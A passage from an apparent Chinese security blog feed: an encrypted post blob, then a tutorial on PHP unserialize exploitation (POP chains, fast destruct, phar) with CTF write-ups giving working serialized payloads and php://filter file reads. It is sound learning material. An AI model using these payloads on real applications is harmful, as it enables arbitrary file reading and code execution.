273ebfa77fa44cf17a66ef9541e01e757a157d88dc74e83a43458ac64ccf1529d236b30f8e10a7b5e8df0a3cf211e3c83e091f4f12891961dfc3728ec0d82416d73f8c166948a3ac34b3c102b6c9d3394c8bf4e3f96bf9609d2294a49f84c4740a050563590b04aba8372f863e72a3b0f33dfe1567b6750562d8b6c9577fa1082fe032aa85ee48b394aba3cd8519d1ef190e43f46430b0d4859abde5b524ef9a68dc89f0556b102c234587ea5550ec0c9c69760cf71d703d5c8deeb948ee7b73998e795408ca0339fdd1134ef05803a1e771b265a154f1ec080858637bad4cd974f6ce3a7099cec7e192713733ca56d27e7c9b6fa6fa66130d8f5cf8b3b81d36ce39c07f0b746777f0821d048c4445aa0ff4c65dc357c09b38634f02a36c7cb24e72d187152cd0d8a2df9d1e5053ee2a5cde10bcd07e0c392bf4075b154c4356fe63e43f9c9eb7aa1276e39157aa3e42239dbed3a486e9f8d67e8fe71d15c4663637dc5ecfcefa4ca62c3adb2973ea388004256780876718b67ed9adef0013c81729beb9dade55fd0d20b3fb78e490cd4b39031b045879c2f0cd16ad9a14bc4c700fd3cf6526726f356e8e2784c39cd44655cfb34ea566f42fd4220638b048b9f5a651617fda8015ec2c49c365758e38948395bfeb64225989863725531e9dadb658bba339cca96a342cee236266cbe5aad5f1ccad010d66d529ac5710cfba90e4e4dba5216af94c27d1b15cbff29f3e46fdda13946f6b95760761c4018789e3d2272fa46f9004e7d89bf8edf539c197dd3d1dd7e096191372c740d21c2ebcc2a3dc53dae5375855fe04c1dc31f789b9f9449d84293711e06b322adb4636127c5efe4cf8ce32b319529ba15983d382756cf4d956e20324bcdc4bec63bda5beb2387efdab8f49d290c2346386e3baed8859a0f64c90aea83a066087881363ecceec7a2afad788722bce097bf256747ad5d88d1c97dd75bf78684755965bab7b09859c6f4238b6df60b7c3612371327917d7116f391da151c23a139e11b5db09cccddec371f6e268bc28ae69de2b29e2c9dcf60e93a0591d407a41a530c1bb30718e690cb9524013f3ce28b6edb9fc86be434e12aae2272a244247627167ba910154756378b232ae46c26ec45865e173b77a41d577cdf20e041c0d2e2c15dd59049302f4693f940629ac88ccf4eedb6e779a6494ba3124a862010ca064039785d752ca8847be1d88d2e012f68c2ffef0d1e9242dc7b044aad4334b11abb89231a52f91395ac0a6d8d45a204072953042089fcb2b1129323061155c4b0ba402b729cdece5b133aec4b7fa844a46459b314d92079f082114fb0b46fcaa19aa4596c15f9ee76cbce76cf3b427f8cd95f00c33e880df4c6bb50f5bfce1a1c3a21b05c230f4047627354985ee8f16826813d7430e2bf5ef666301445e36499f177f56696f3a636f7e14b096db63400905db98ee8f1d23662e5719110de6175d15bf4ad412077b8270a664f39359bbadac8e3f6fe8be678877a6784eae757449d0a41e0d0ea641466c43d95daf5ccc3e4d730038f5b9dc3997dd8ac788fd46cd2c7ee0d15f266319693a81136deca960be94dcd68402351bbf740a7c0a87f4b93b8c8a21565049ac813bc55f9c27c7b3b37c845663507a4dd64e88d5d5be016525a29814069fd1f88e9c282b741d203a552473aa42660985afb27aed48c092b6cf9b9d0217161dab27155dae7b4be6fcf5344fcdb4a35508c999df6c357927525eab84120232e41dcf1e31017356974c2756183487d6bb6401c22a3254b6f8cd5dcfb3970f0269d64a0c0726ecbb7243d4e45bc7c88dd1c3d89b153baf2eab42e4ca6356131c25ee1bcea311b118dd080aefbe4f7916f7539fe7fb26c9b214cd8df8eda50828a3a3a3c4e8bc9a1bf1fdd43e77d07a6c827363b69a5e61c68bbf31731aedb81bca455bede6ff60cb6a3c0564f0de8d494a43fe5c210cff33f37d25127623e29e6e0e149179cceccf7162e1766803f3a953e6a42c61712ead90df0e41d31df24c52a5bf3f83023f209aff1fce2c38e5732e77e141011f8e5ccdd8de93b86a2dc056135508a64173df3a3203857a2445c05eb7ec0c26be1c919cdc372c1be1cc9f998c0a41b0ac108b84ef8037373a89550180ce0dd7d500702e7a582003ee3c1d62477e7c67ab9dc684cd0e0b59fa33f561253bd9d4af05e6bdb6d95c31735c408418f07ee68f8737821138748e451fdcfe8b850bfad1535762aaa063199fd00624536e45480ad2220790a68d6f82ffe9f6fda9860eb77b5f7f4793c395c7ca857e5819c8148812bc0812d2ae6a116ab48eb513a0c2e4a33e0083a6bc70cc0524ad8b5e657292c0296d886d10718fc04c8728354403a7cb63619e97fd4b6674532e97e894ddfbab9c3da5941befbd2b16bf6f2c006485c617587d3dc90c5c1cda22bd13074876776db71cc811670b93c0fd840911c68f52f26fcea316f156fadf393f69d86faa9368fc13a0de5b7e7ee8e9e19e8511ba9497c95059d7a26668f4c8f22d42ecc73ff1c9e212ab9e748055653e2cd191d35bd40b3531f75018f99537a2fde16f62f19cf5f1eda438ced1ccb9be859525abf834f087bfdc5200c4a6ad2a495ed3049d25c8ce9a871b780a276e517655e02d413aada104e82cbf04c9c383ae9390014565d125ba23b1a278fd710441149b69d999cc203c0936156e588565717ad949e4c80a9303b14543fcfecf5f7677aeb8bfaa9c27d64c9014f2bcf489cef5e3e82057c21fc092065ceea3f87404c6da6b9f9453fa8656f3075f29f2067805a7e67b8fb499c1412f37704bdcfe6509c8ef933e3f5c13f4aecf2691a5200274d7a57072ea863727049d82783ce55d37505964a46cf01c8ff184f6f7cb1fac081d330d9f4abf56db4916c914156f238960b94801270c5008abb4e3d03d0aaf28fc41ca3c020659ba65354217f32f26559c350d12e6d3b0ac925f4de9903530cbb685099da63518bad31eb9a56e1fccbdd7bc2469794a31335a75916c8ccb8e71acc76e4bae7ccda860428946241834b6d27ef53b8437fd125da967370e61a3adb9967a94d30554027c336da81b9e3e94b0f3ae85d0f498d841a5ec0bc7ef926ab9582bb1151836665fb18caba9a4d26b976445903e24d03a129506374732594d4c09dd199f8ceab0c01e7421e3c6a0f45e85b6b35e291a8394b222c8168ca8a9912d06263faae5016157fe7395f942654c6d01dfef5805b80d51c85389ad837e6529e6ab1bfb70f0a973fc7bcabfd282c36ad1e1494d01201d911fac4ec62874a853219019a5579abbc87c150ce07c22ddd7149f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">猜猜看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>php的序列化和反序列化主要是通过serialize和unserialize两个函数</p><p>serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象，对反序列化进行利用也主要是通过其中的魔术方法</p> <span id="more"></span><p>几个常见的魔术方法</p><pre class="language-none"><code class="language-none">__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。__toString：当对象被当做一个字符串使用时调用。__sleep:序列化对象之前就调用此方法(其返回需要一个数组)__wakeup:反序列化恢复对象之前调用该方法__call:当调用对象中不存在的方法会自动调用该方法。__get:在调用不可访问的属性的时候会自动执行(私有，或不存在)__isset()在不可访问的属性上调用isset()或empty()触发__invoke()当尝试把对象当方法调用时调用。__unset()在不可访问的属性上使用unset()时触发</code></pre><p>格式</p><pre class="language-none"><code class="language-none">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;i:20;&#125;类型:长度:&quot;名字&quot;:类中变量的个数:&#123;类型:长度:&quot;名字&quot;;类型:长度:&quot;值&quot;;......&#125;</code></pre><p>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><p>private类型有隐藏的空格符</p><p><strong>反序列化的常见起点</strong></p><p>__wakeup 一定会调用</p><p>__destruct 一定会调用</p><p>__toString 当一个对象被反序列化后又被当做字符串使用</p><p><strong>反序列化的常见中间跳板:</strong></p><p>__toString 当一个对象被当做字符串使用<br>__get 读取不可访问或不存在属性时被调用<br>__set 当给不可访问或不存在属性赋值时被调用<br>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 $this-&gt;$func();</p><p><strong>反序列化的常见终点:</strong></p><p>__call 调用不可访问或不存在的方法时被调用<br>call_user_func 一般php代码执行都会选择这里<br>call_user_func_array 一般php代码执行都会选择这里</p><h1 id="POP链简介"><a href="#POP链简介" class="headerlink" title="POP链简介"></a><strong>POP链简介</strong></h1><p>借鉴的文章：</p><p><a href="https://www.jianshu.com/p/16c56bebc63d">php反序列化利用——POP链构造实例 - 简书 (jianshu.com)</a></p><p><a href="https://blog.csdn.net/qq_43431158/article/details/105265462">(1条消息) PHP反序列化—构造POP链_Lemon&#39;s blog-CSDN博客_php反序列化pop链</a></p><p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。</p><h1 id="POP链利用技巧"><a href="#POP链利用技巧" class="headerlink" title="POP链利用技巧"></a>POP链利用技巧</h1><p>1、一些有用的POP链中出现的方法：</p><pre class="language-php" data-language="php"><code class="language-php">- 命令执行：exec()、passthru()、popen()、system()、eval()- 文件操作：file_put_contents()、file_get_contents()、unlink()</code></pre><p>2、<strong>反序列化中为了避免信息丢失，使用大写S支持字符串的编码。</strong>PHP 为了更加方便进行反序列化 Payload 的 传输与显示(避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写S表示字符串，此时这 个字符串就支持将后面的字符串用16进制表示，使用如下形式即可绕过，即：</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token property">s</span><span class="token punctuation">:</span>4<span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span> -> <span class="token property">S</span><span class="token punctuation">:</span>4<span class="token punctuation">:</span><span class="token string">"use\72"</span><span class="token punctuation">;</span></code></pre><p>3、深浅copy：在 php中如果我们使用 &amp; 对变量A的值指向变量B，这个时候是属于浅拷贝，当变量B改变时，变量A也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。<br> 4、配合PHP伪协议实现文件包含、命令执行等漏洞。</p><h1 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast destruct"></a>fast destruct</h1><blockquote><p>1、PHP中，如果单独执行unserialize函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。</p><p>2、PHP中，如果用一个变量接住反序列化函数的返回值，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，那么在PHP脚本走完流程之后，这个对象才会被销毁，在有析构函数的情况下就会将其执行。</p></blockquote><p>fast destruct就是为了解决第二个问题的，让反序列化提前执行。</p><p>方法就是破坏反序列化后数据的结构，导致提前进入destruct方法</p><p>应用场景：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);class superGate&#123;    public $gay &#x3D; true;    function __destruct()&#123;        echo file_get_contents(&quot;&#x2F;flag&quot;);        die();    &#125;&#125;$p &#x3D; $_GET[&#39;p&#39;];$honey &#x3D; unserialize($p);if(preg_match(&quot;&#x2F;superGate&#x2F;i&quot;, serialize($honey)))&#123;    echo &quot;no&quot;;    throw Exception();&#125;show_source(__FILE__);</code></pre><p>如果正常进行序列化，在调用__destruct之前，我们序列化的内容就以及被if判断给抛出异常了</p><p>具体实现：</p><p>1.采用数组的方式（感觉局限性很大</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);class superGate&#123;    public $gay &#x3D; true;    function __destruct()&#123;        echo 1111;&#x2F;&#x2F;        die();    &#125;&#125;class a&#123;    public $gay &#x3D; true;&#125;&#x2F;&#x2F;$p &#x3D; &#39;O:9:&quot;superGate&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;&#39;;&#x2F;&#x2F;$q &#x3D; serialize(array(0 &#x3D;&gt; new superGate(),1&#x3D;&gt;new a(),3&#x3D;&gt;&#39;&#39;));#得到结果之后把索引改了，这样在反序列化的时候会因为有两个一样的索引，导致覆盖前边的内容，让前边的内容提前销毁&#x2F;&#x2F;echo $q;$honey &#x3D; unserialize(&#39;a:3:&#123;i:0;O:9:&quot;superGate&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:0;O:1:&quot;a&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:3;s:0:&quot;&quot;;&#125;&#39;);if(preg_match(&quot;&#x2F;superGate&#x2F;i&quot;, serialize($honey)))&#123;    echo &quot;no&quot;;    throw Exception();&#125;</code></pre><p>2.</p><p>破坏序列化结构，比如修改个数，或者去掉最后边的一个大括号</p><h1 id="PHP-Incomplete-Class"><a href="#PHP-Incomplete-Class" class="headerlink" title="__PHP_Incomplete_Class"></a>__PHP_Incomplete_Class</h1><p>在PHP中，当我们在反序列化一个不存在的类时，就比如这个<code>a:3:&#123;i:0;O:9:&quot;superGate&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:1;O:1:&quot;a&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:3;s:0:&quot;&quot;;&#125;</code></p><p>结果会变为</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230410212601861.png" alt="image-20230410212601861"></p><p>类名被__PHP_Incomplete_Class 代替了，而原有的类名被存放到了__PHP_Incomplete_Class_Name里</p><p>可是如果这时候再将这个内容进行序列化</p><p>得到的还是正常格式的序列化字符串<code>a:3:&#123;i:0;O:9:&quot;superGate&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:1;O:1:&quot;a&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:3;s:0:&quot;&quot;;&#125;</code></p><p>可是假设我们构造的payload是<code>a:1:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:3:&quot;abc&quot;;s:5:&quot;aaaaa&quot;;&#125;&#125;</code></p><p>那么在反序列化时得到的结果就是</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230410214158351.png" alt="image-20230410214158351"></p><p>这时候再进行二次序列化得到的就变成了<code>a:1:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:0:&#123;&#125;&#125;</code>由于没有找到__PHP_Incomplete_Class_Name绑定的类名，所以后边的东西被丢弃了</p><p><strong>例题</strong></p><p>强网杯2021 WhereIsUWebShell </p><h1 id="利用phar协议实现反序列化漏洞攻击"><a href="#利用phar协议实现反序列化漏洞攻击" class="headerlink" title="利用phar协议实现反序列化漏洞攻击"></a>利用phar协议实现反序列化漏洞攻击</h1><p><strong>漏洞成因</strong> </p><p>phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数(file_exists()、is_dir()等)参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作</p><p>原理分析 </p><p>phar的组成</p><p>通过查阅手册发现phar由四部分组成；翻阅手册可以知道，phar由四个部分组成，分别是<code>stub、manifest describing the contents、 the file contents、 [optional] a signature for verifying Phar integrity (phar file format only)</code> 下面进行解释一下；</p><p>1 .0  a stub</p><p>标识作用，格式为</p><pre class="language-none"><code class="language-none">xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code></pre><p>，前面任意，但是一定要以__HALT_COMPILER();?&gt;结尾，否则php无法识别这是一个phar文件；</p><p>2 .0 </p><p>a manifest describing the contents</p><p>其实可以理解为phar文件本质上是一中压缩文件，其中包含有压缩信息和权限，当然我们需要利用的序列化也在里面；</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/425be1b3b3df9e7799bbae0ade22b5ac-16378452560562.png" alt="425be1b3b3df9e7799bbae0ade22b5ac.png"></p><p>3 .0 the file contents</p><p>这里指的是被压缩文件的内容；</p><p>4 .0 [optional] a signature for verifying Phar integrity (phar file format only)</p><p>签名，放在结尾；</p><h1 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h1><p>(这里放一下自己做过的反序列化题，持续更新.jpg</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501204543745.png" alt="image-20210501204543745"></p><p>看见file_get_contents(),利用伪协议data://text/plain;base64绕过</p><p>再利用php://filter读取useless内的内容</p><p>解码后</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501183046395.png" alt="image-20210501183046395"></p><p>可知flag在flag.php中</p><p>试图让file=flag.php</p><p>看到unserialize函数，利用php反序列化</p><p>构造payload</p><p>？text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501205224647.png" alt="image-20210501205224647"></p><p>查看源码找到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501205239104.png" alt="image-20210501205239104"></p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>页面中提示有备份文件，御剑扫一遍</p><p>找到存在<a href="http://www.zip/">www.zip</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220739803.png" alt="image-20210501220739803"></p><p>重点在class.php和index.php中</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220822144.png" alt="image-20210501220309908"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220857753.png" alt="image-20210501220857753"></p><p>所以要传入一个select参数，利用反序列化让username=admin</p><p>password=100</p><p>因为username和password两个为private类型</p><p>所以有隐藏的空格符</p><p>select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot;</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220212731.png" alt="image-20210501220212731"></p><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>题目源码</p><pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file&#x3D;&#39;index.php&#39;)&#123;        $this-&gt;source &#x3D; $file;        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source &#x3D; &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p &#x3D; array();    &#125;    public function __get($key)&#123;        $function &#x3D; $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    @unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;    $a&#x3D;new Show;    highlight_file(__FILE__);&#125;</code></pre><p>题目里出现的魔术变量</p><pre class="language-none"><code class="language-none">__construct   当一个对象创建时被调用，__toString   当一个对象被当作一个字符串被调用。__wakeup()   使用unserialize时触发__get()    用于从不可访问的属性读取数据#难以访问包括：（1）私有属性，（2）没有初始化的属性__invoke()   当脚本尝试将对象调用为函数时触发</code></pre><p>这里可以看出来首先要get进一个pop值，并进行反序列化，所以就会调用__wakeup()这个方法_</p><p>__<em>wakeup()中里利用preg_match对传入的值进行过滤，但如果this-&gt;source是show类，就会调用</em>__toString</p><p>这里会返回$this-&gt;str-&gt;source，但如果没有source这个属性，接下来就会调用__get()，然后会将对象调用为函数，</p><p><em>这里也就会触发</em>__invoke()，进而调用append</p><p>在append的中存在include，所以可以利用文件包含漏洞读到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210704003613462.png" alt="image-20210704003613462"></p><p>payload</p><p>（自己写一个还是有点困难</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass Modifier&#123;    protected $var &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source &#x3D; $file;    &#125;&#125;class Test&#123;    public $p;&#125;$a &#x3D; new Show(&#39;aaa&#39;);$a-&gt;str &#x3D; new Test();$a-&gt;str-&gt;p &#x3D; new Modifier();$b &#x3D; new Show($a);echo urlencode(serialize($b));</code></pre><p>base64解码拿到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210704003713873.png" alt="image-20210704003713873"></p><h2 id="CODE-REVIEW"><a href="#CODE-REVIEW" class="headerlink" title="CODE REVIEW"></a>CODE REVIEW</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705135850186.png" alt="image-20210705135850186"></p><p>代码审计可以看出这里首先要先get进pleaseget=1然后post进pleasepost，md51，md52和obj四个值，而obj这里存在反序列化的漏洞</p><p>且当if($this-&gt;correct === $this-&gt;input)成立时就会打印出flag</p><p>这里同时要求传入的md51和md52的md5值相等，且自身不相等，由于md5不能处理数组，所以传入数组的返回值都为null</p><p>而因为$this-&gt;correct这里进行了编码，所以要使if语句成立在构造payload时可以采用引用赋值的方法</p><p>构造payload</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705141338826.png" alt="image-20210705141338826"></p><p>//uniqid() :函数基于以微秒计的当前时间，生成一个唯一的 ID。</p><p>//传值赋值：变量默认总是传值赋值。那也就是说，当将一个表达式的值赋予一个变量时，整个原始表达式的值被赋值到目标变量。这意味着，例如，当一个变量的值赋予另外一个变量时，改变其中一个变量的值，将不会影响到另外一个变量。</p><p>//引用赋值：PHP 也提供了另外一种方式给变量赋值：引用赋值。这意味着新的变量简单的引用（换言之，“成为其别名” 或者 “指向”）了原始变量。改动新的变量将影响到原始变量，反之亦然。</p><p>所以最终payload为</p><p>get内容为：?pleaseget=1</p><p>post内容为：pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:{s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;}</p><p>拿到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705141616910.png" alt="image-20210705141616910"></p><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op &#x3D; &quot;1&quot;;        $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;;        $content &#x3D; &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;            $res &#x3D; $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res &#x3D; &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res &#x3D; file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)            $this-&gt;op &#x3D; &quot;1&quot;;        $this-&gt;content &#x3D; &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i &#x3D; 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))            return false;    return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;    $str &#x3D; (string)$_GET[&#39;str&#39;];    if(is_valid($str)) &#123;        $obj &#x3D; unserialize($str);    &#125;&#125;</code></pre><p>看到unserialize可以很容易想到反序列化，源码里还有file_get_contents，所以猜测这题是利用反序列化通过文件包含读取flag，利用php://filter来造成任意文件读取</p><p>在传入后还存在一个is__valid()函数的过滤，要求传入内容的ascii码在32到123之内</p><p>之后进行反序列化，由于要利用file_get_contents()读取flag，并将其打印出来，所以需要让op=2，执行read()中的内容</p><p>构造payload</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705150325057.png" alt="image-20210705150325057"></p><p>这里因为protect进行反序列化时会出现特殊符号，导致无法通过is__valid函数的过滤，可以利用对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。</p><pre class="language-php" data-language="php"><code class="language-php">?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></pre><p>（刚开始给op赋了个字符型的“2”，找错找了半天。。。</p><p>拿到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705150240715.png" alt="image-20210705150240715"></p><p>接下来base64解码就可以拿到flag了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705150647307.png" alt="image-20210705150647307"></p><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p>代码审计</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$function &#x3D; @$_GET[&#39;f&#39;];function filter($img)&#123;  $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);  $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;  return preg_replace($filter,&#39;&#39;,$img);&#125;if($_SESSION)&#123;  unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;$_SESSION[&#39;function&#39;] &#x3D; $function;extract($_POST);if(!$function)&#123;  echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;&#125;if(!$_GET[&#39;img_path&#39;])&#123;  $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);&#125;else&#123;  